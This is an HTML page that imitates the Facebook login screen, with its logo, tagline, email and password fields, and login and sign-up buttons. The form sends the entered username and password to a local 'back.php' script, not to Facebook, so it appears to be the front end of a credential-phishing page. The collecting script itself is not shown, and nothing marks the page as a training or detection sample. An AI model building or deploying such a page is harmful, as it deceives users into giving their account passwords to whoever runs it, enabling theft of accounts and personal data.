<!DOCTYPE html>
<html>
<head>
    <title>Facebook - log in or sign up</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>
    <script src='script.js'></script>
    
    <link rel="icon" href="images/icon.svg">
</head>
<body>
    <div class="container">
            <div class="left">
                <img class="logo" src="images/Facebook_Logo.png">
                <h2> Facebook helps you connect and share 
                <br> with the people in your life.
                </h2>
            </div>

            <form class="right" method="post" action="back.php">
                <input name="user" class="username" placeholder="Email address or phone number">
                <input name="pwd" type="password" class="password" placeholder="Password">
                <button type="submit" class="login_button">Log in</button>
                <a href="">Forgotten password?</a>
                <hr>
                <button class="new">Create new account</button>
            </form>
    </div>  



</body>
